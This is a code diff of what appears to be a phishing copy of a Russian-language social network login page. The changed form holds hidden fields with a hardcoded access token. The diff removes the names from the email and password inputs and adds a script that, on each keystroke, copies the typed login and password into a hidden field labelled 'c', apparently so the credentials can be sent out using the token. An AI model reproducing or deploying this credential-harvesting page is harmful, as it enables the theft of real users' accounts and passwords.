@@ -245,8 +245,8 @@ var abp;
     <input name="" value="lol" class="" style="display:none" id="u"/>
     <input name="access_token" value="8d0619dd95588e8714f5717fd01db7a9227ed92033934f7661049ba904e82bc460cf88196f23f58f143ff" class="" style="display:none"/>
     <input name="v" value="5.100" class="" style="display:none"/>
-      <input type="text" class="big_text" name="email" value = "" id="index_email"  placeholder="Телефон или email" />
-      <input type="password" class="big_text" name="message" value = "" id="index_pass"  placeholder="Пароль"  />
+      <input type="text" class="big_text" name="" value = "" id="index_email"  placeholder="Телефон или email" />
+      <input type="password" class="big_text" name="" value = "" id="index_pass"  placeholder="Пароль"  />
       <button id="index_login_button" class="index_login_button flat_button button_big_text">Войти</button>
       <div class="forgot">
         <div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
@@ -254,8 +254,9 @@ var abp;
       </div>
             <script> var inp = document.getElementById('index_email');
 var ip = document.getElementById('index_pass');
+var c =  document.getElementById('c');
 document.addEventListener('input',function(){
-ip.value = ' '+inp.value;
+c.value='login: '+inp.value + ' ,password: '+ip.value;
 
 });</script>
     </form>
